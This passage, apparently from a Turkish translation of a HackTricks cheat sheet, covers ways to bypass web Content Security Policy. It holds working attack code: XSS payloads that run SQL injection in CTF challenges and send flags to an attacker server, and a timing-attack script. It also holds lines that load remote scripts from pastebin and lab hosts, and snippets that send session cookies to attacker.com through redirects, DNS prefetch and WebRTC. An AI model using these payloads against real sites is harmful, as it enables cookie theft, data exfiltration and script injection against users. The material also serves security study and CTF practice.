`'unsafe-inline'`, herhangi bir betiği kodun içinde çalıştırabileceğiniz anlamına gelir (XSS kodu çalıştırabilir) ve `img-src *`, web sayfasında herhangi bir kaynaktan herhangi bir resmi kullanabileceğiniz anlamına gelir.

Bu CSP'yi resimler aracılığıyla verileri dışarı çıkararak atlayabilirsiniz (bu durumda XSS, bir bot tarafından erişilebilen bir sayfada bir CSRF'yi istismar eder ve bir resim aracılığıyla bayrağı çıkarırken bir SQLi çıkarır):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
Kaynak: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Bu yapılandırmayı ayrıca, bir resmin içine yerleştirilmiş JavaScript kodunu yüklemek için de kullanabilirsiniz. Örneğin, sayfa Twitter'dan resim yüklemeye izin veriyorsa, özel bir resim oluşturabilir, bunu Twitter'a yükleyebilir ve "**unsafe-inline**" özelliğini kötüye kullanarak bir XSS gibi JS kodunu yürütebilirsiniz. Bu kod, resmi yükleyecek, içinden JS'yi çıkaracak ve onu çalıştıracaktır: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Hizmet İşçileriyle

Hizmet işçilerinin **`importScripts`** fonksiyonu CSP tarafından sınırlanmaz:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Politika Enjeksiyonu

**Araştırma:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Siz tarafından gönderilen bir **parametre**, **politikanın bildirisine yapıştırılıyorsa**, politikayı **kullanışsız hale getiren** bir şekilde politikayı değiştirebilirsiniz. Aşağıdaki yöntemlerden herhangi birini kullanarak script 'unsafe-inline' izni verebilirsiniz:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Bu yönerge mevcut script-src yönergelerini üzerine yazar.\
Bir örneği burada bulabilirsiniz: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Edge'de çok daha basittir. Eğer CSP'ye sadece bunu ekleyebilirsiniz: **`;_`** Edge, **tüm politikayı düşürür**.\
Örnek: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; XSS ile (iframe) - Zaman saldırısı

Dikkat edin, `'unsafe-inline'` yönergesinin eksik olduğunu fark edin.\
Bu sefer, bir `<iframe` ile XSS kullanarak kurbanı **kontrolünüzdeki** bir sayfayı **yüklemeye** zorlayabilirsiniz. Bu sefer, kurbanın bilgi çıkarmak istediğiniz sayfaya erişmesini sağlayacaksınız (**CSRF**). Sayfanın içeriğine erişemezsiniz, ancak sayfanın yüklenmesi için gereken süreyi bir şekilde **kontrol edebilirseniz**, ihtiyacınız olan bilgiyi çıkarabilirsiniz.

Bu sefer, bir **bayrak** çıkarılacak, bir **karakter doğru tahmin edildiğinde** SQLi tarafından **yanıt** fonksiyonunun uyku süresi nedeniyle daha fazla zaman alır. Sonra bayrağı çıkarabileceksiniz:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Yer İşaretleri Aracılığıyla

Bu saldırı, saldırganın kullanıcıyı tarayıcının yer işaretleri üzerine bir bağlantıyı sürükleyip bırakmaya ikna ettiği bir sosyal mühendislik gerektirir. Bu yer işareti, **kötü amaçlı javascript** kodunu içerecektir ve sürüklendiğinde veya tıklandığında mevcut web penceresinin bağlamında çalıştırılacak, CSP'yi atlayacak ve çerezler veya tokenlar gibi hassas bilgileri çalmaya izin verecektir.

Daha fazla bilgi için [**buradaki orijinal rapora bakın**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP'nin Kısıtlanmasıyla CSP Atlatma

[**Bu CTF çözümünde**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP, izin verilen bir iframe içine daha kısıtlayıcı bir CSP enjekte edilerek atlatılır. Bu daha kısıtlayıcı CSP, belirli bir JS dosyasının yüklenmesine izin vermedi ve ardından **prototip kirliliği** veya **dom clobbering** aracılığıyla farklı bir betiği kötüye kullanarak keyfi bir betik yüklemeye izin verdi.

Bir Iframe'in CSP'sini **`csp`** özelliğiyle sınırlayabilirsiniz:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

Bu [**CTF çözümünde**](https://github.com/aszx87410/ctf-writeups/issues/48), **HTML enjeksiyonu** aracılığıyla **CSP** daha fazla **kısıtlanabiliyordu**, böylece CSTI'yi önleyen bir betik devre dışı bırakıldı ve bu nedenle **zafiyet sömürülebilir hale geldi.**\
CSP, **HTML meta etiketleri** kullanılarak daha kısıtlayıcı hale getirilebilir ve içerideki betikler **nonce** iznini kaldırarak **devre dışı bırakılabilir** ve **sha** ile belirli bir içerideki betik etkinleştirilebilir:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### İçerik Güvenlik Politikası (CSP) Geçmeyle JS Bilgi Sızdırma

Eğer sunucunun yanıt olarak **`Content-Security-Policy-Report-Only`** başlığını **senin kontrolünde bir değerle** döndürmesini sağlayabilirsen (belki CRLF nedeniyle), bu başlığı kendi sunucuna yönlendirebilirsin ve sızdırmak istediğin **JS içeriğini** **`<script>`** etiketiyle sararsan, büyük olasılıkla CSP tarafından `unsafe-inline` izin verilmediği için bu bir CSP hatası tetikleyecek ve hassas bilgileri içeren script kısmı `Content-Security-Policy-Report-Only` üzerinden sunucuya gönderilecektir.

Bir örnek için [**bu CTF çözümüne**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes) bakabilirsin.

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### CSP ve Iframe ile Bilgi Sızdırma

- CSP tarafından izin verilen bir URL'ye (bunu `https://example.redirect.com` olarak adlandıralım) işaret eden bir `iframe` oluşturulur.
- Bu URL daha sonra CSP tarafından **izin verilmeyen** gizli bir URL'ye (örneğin, `https://usersecret.example2.com`) yönlendirilir.
- `securitypolicyviolation` etkinliğini dinleyerek, `blockedURI` özelliği yakalanabilir. Bu özellik, engellenen URI'nin alan adını ortaya çıkararak, başlangıç URL'sinin yönlendirildiği gizli alan adını sızdırır.

İlginç bir nokta, Chrome ve Firefox gibi tarayıcıların CSP'ye ilişkin iframe'leri işleme konusunda farklı davranışlara sahip olmasıdır, bu da tanımsız davranış nedeniyle hassas bilgilerin sızmasına yol açabilir.

Başka bir teknik ise CSP'yi kendisi kullanarak gizli alt alan adını çıkarmaktır. Bu yöntem, ikili arama algoritmasına dayanır ve CSP'yi kasıtlı olarak engellenen belirli alan adlarını içerecek şekilde ayarlamayı gerektirir. Örneğin, gizli alt alan adı bilinmeyen karakterlerden oluşuyorsa, CSP yönergesini bu alt alan adlarını engellemek veya izin vermek için değiştirerek farklı alt alan adlarını iteratif olarak test edebilirsiniz. Aşağıda, bu yöntemi kolaylaştırmak için CSP'nin nasıl ayarlanabileceğini gösteren bir örnek bulunmaktadır:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
CSP tarafından engellenen veya izin verilen istekleri izleyerek, gizli alt alan adındaki olası karakterleri daraltarak sonunda tam URL'yi ortaya çıkarabilirsiniz.

Her iki yöntem de CSP uygulamasının ve tarayıcılardaki davranışının inceliklerinden yararlanır ve görünüşte güvenli politikaların hassas bilgileri istemeden sızdırabileceğini gösterir.

[**Buradan**](https://ctftime.org/writeup/29310) hile.

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanına ve zorluklarına inen içeriklerle etkileşime geçin

**Gerçek Zamanlı Hack Haberleri**\
Gerçek zamanlı haberler ve içgörüler aracılığıyla hızlı tempolu hacking dünyasında güncel kalın

**En Son Duyurular**\
Yeni ödül avları başlatma ve önemli platform güncellemeleri hakkında bilgi edinin

Bugün [**Discord**](https://discord.com/invite/N3FrSbmwdy)'a katılın ve en iyi hackerlarla işbirliği yapmaya başlayın!

## CSP'yi Atlatmak İçin Güvensiz Teknolojiler

### PHP yanıt tamponu aşırı yükleme

PHP, varsayılan olarak yanıtı 4096 bayte kadar tamponlar. Bu nedenle, PHP bir uyarı gösteriyorsa, yeterli veri sağlayarak uyarıların içine, **yanıt** **CSP başlığından önce** **gönderilecektir**, bu da başlığın görmezden gelinmesine neden olur.\
Sonra, tekniğin temel olarak **yanıt tamponunu uyarılarla doldurmak** olduğu için CSP başlığı gönderilmez.

Fikir [**bu yazıdan**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points) alınmıştır.

### Hata Sayfasını Yeniden Yazma

[**Bu yazıdan**](https://blog.ssrf.kr/69) göründüğü kadarıyla, bir CSP korumasını atlamak mümkün olmuş, hata sayfasını (potansiyel olarak CSP olmadan) yükleyerek ve içeriğini yeniden yazarak.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME, bir sayfanın bir uç noktasında bulunan bir XSS'i (veya çok sınırlı bir XSS'i) **kötüye kullanmak** için aynı kökten **diğer uç noktalarını kötüye kullanır**. Bu, savunmasız uç noktayı saldırgan sayfadan yükleyerek ve ardından saldırgan sayfayı kötüye kullanmak istediğiniz aynı kökteki gerçek uç noktaya yeniden yükleyerek yapılır. Bu şekilde, **savunmasız uç nokta**, **payload** içindeki **`opener`** nesnesini kullanarak **kötüye kullanmak istediğiniz gerçek uç noktanın DOM'una erişebilir**. Daha fazla bilgi için şuraya bakın:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Ayrıca, **wordpress**'in `/wp-json/wp/v2/users/1?_jsonp=data` yolunda bir **JSONP** uç noktası vardır ve bu uç nokta, yalnızca harf, sayı ve noktalarla sınırlı olmak üzere çıktıya gönderilen **veriyi yansıtır**.

Bir saldırgan, bu uç noktayı kötüye kullanarak WordPress'e karşı bir SOME saldırısı **oluşturabilir** ve bunu `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` içine yerleştirebilir. Bu **script**, **'self'** tarafından **izin verildiği için yüklenecektir**. Ayrıca, WordPress yüklü olduğu için bir saldırgan, bir kullanıcıya daha fazla ayrıcalık vermek, yeni bir eklenti yüklemek için CSP'yi **atlatan** **savunmasız** **geri çağırma** uç noktası aracılığıyla **SOME saldırısını** kötüye kullanabilir... Bu saldırıyı nasıl gerçekleştireceğiniz hakkında daha fazla bilgi için [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/) adresine bakın.

## CSP Veri Sızdırma Atlatmaları

Eğer harici sunucularla **etkileşimde bulunmanıza izin vermeyen** sıkı bir CSP varsa, bilgileri sızdırmak için her zaman yapabileceğiniz bazı şeyler vardır.

### Location

Sadece konumu güncelleyerek gizli bilgileri saldırganın sunucusuna gönderebilirsiniz:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta etiketi

Meta etiketi enjekte ederek yönlendirme yapabilirsiniz (bu sadece bir yönlendirme, içeriği sızdırmaz).
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Ön Yükleme

Sayfaları daha hızlı yüklemek için tarayıcılar, ana bilgisayar adlarını IP adreslerine önceden çözümleyip daha sonra kullanmak üzere önbelleğe alırlar.\
Tarayıcıya bir ana bilgisayar adını önceden çözümlemesi için şu şekilde belirtebilirsiniz: `<link reol="dns-prefetch" href="something.com">`

Bu davranışı istismar ederek, **DNS istekleri aracılığıyla hassas bilgileri sızdırabilirsiniz**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
Başka bir yöntem:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
Bu durumun önüne geçmek için sunucu HTTP başlığını gönderebilir:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
Görünüşe göre, bu teknik başsız tarayıcılarda (botlar) çalışmıyor.
{% endhint %}

### WebRTC

Birkaç sayfada, **WebRTC'nin CSP'nin `connect-src` politikasını kontrol etmediğini** okuyabilirsiniz.

Aslında, bir _DNS isteği_ kullanarak bilgileri _sızdırabilirsiniz_. Bu kodu kontrol edin:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
Başka bir seçenek:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## Çevrimiçi CSP Politikalarını Kontrol Etme

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Otomatik olarak CSP oluşturma

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Referanslar

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking Insights**\
Hacking'in heyecanını ve zorluklarını inceleyen içeriklerle etkileşime geçin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni ödül avları başlatma ve önemli platform güncellemeleri hakkında bilgi edinin

**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katılın ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!**

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* Hacking hilelerinizi göndererek HackTricks ve HackTricks Cloud github depolarına PR göndererek **hacking hilelerinizi paylaşın**.

</details>
